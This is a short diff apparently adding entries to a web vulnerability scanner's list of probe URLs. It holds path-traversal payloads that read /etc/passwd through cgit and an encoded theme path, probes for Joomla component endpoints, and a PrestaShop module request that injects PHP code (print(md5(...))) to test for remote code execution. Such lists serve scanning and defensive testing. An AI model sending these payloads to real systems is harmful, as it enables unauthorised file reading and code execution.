@@ -26,3 +26,6 @@
 /cgit/cgit.cgi/git/objects/?path=../../../../../../../etc/passwd
 /theme/default/img/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//etc/passwd
 /
+/index.php?option=com_zhbaidumap&no_html=1&format=raw&task=getPlacemarkDetails
+/index.php?option=com_prayercenter&task=confirm&id=1&sessionid=1
+/modules/bamegamenu/ajax_phpcode.php?code=print(md5({{num}}))
